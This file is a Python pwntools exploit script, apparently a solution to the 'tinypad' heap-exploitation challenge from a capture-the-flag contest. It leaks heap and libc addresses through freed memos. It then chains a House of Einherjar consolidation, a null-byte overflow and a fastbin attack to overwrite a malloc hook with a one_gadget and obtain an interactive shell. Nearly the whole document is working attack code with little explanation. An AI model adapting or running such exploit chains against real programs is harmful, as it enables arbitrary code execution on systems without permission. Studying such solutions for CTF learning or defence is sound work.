from pwn import *

# Set up pwntools for the correct architecture
exe = "./tinypad"
context.binary = elf = ELF(exe)
context.log_level = "debug"
context.aslr = True
libc = ELF("./libc.so.6")

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    set max-visualize-chunk-size 0x500
    c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

def add_memo(len, memo):
    sl('A')
    sl(str(len).encode())
    sl(memo)
    return ru(b"(CMD)>>> ")

def delete_memo(i):
    sl('D')
    sl(str(i))
    return ru(b"(CMD)>>> ")

def edit_memo(index, copy):
    sl('E')
    sl(str(index))
    sl(copy)
    sl('Y')
    return ru(b"(CMD)>>> ")

def refresh():
    sl('')
    return ru(b"(CMD)>>> ")

r = start()
# r = remote("", )


add_memo(0x100, b"aAAAAAAA")
add_memo(0x100, b"bAAAAAAA")
add_memo(0x100, b"cAAAAAAA")
add_memo(0x100, b"dAAAAAAA")

delete_memo(3)
delete_memo(1)

ru(b" #   INDEX: 1")
ru(b" # CONTENT: ")
heap = u64(re(4).ljust(8, b"\x00")) - 544

ru(b" #   INDEX: 3")
ru(b" # CONTENT: ")
libc.address = u64(re(6).ljust(8, b"\x00")) - 3925944

log.info(f"{hex(heap)}, {hex(libc.address)}")

#cleanup
delete_memo(2)
delete_memo(4)

# house of einherjar
size = 10
add_memo(0x48, b"A"*16 + p64(heap+16) + p64(heap+16))
add_memo(0x68, b"B"*0x47)
add_memo(0xf8, b"C"*0x47)
add_memo(0x58, b"s.top-chunk-consolidation")
delete_memo(2)

# Null byte overflow.
add_memo(0x68, b"A"*(0x68-8) + p64(176))
delete_memo(3)
one_gadget = libc.address + 0xe66bd

#make fastchunk
delete_memo(2)

add_memo(0x58, b"AAAAAAAA"*7 + p64(0x71) + p64(libc.address + 3925773))
delete_memo(4)
add_memo(0x68, b"hello")
add_memo(0x68, b"\x00"*(51-16) + p64(one_gadget))

# Calling malloc to call the hook
delete_memo(1)
add_memo(0x69, b"boom")

r.interactive()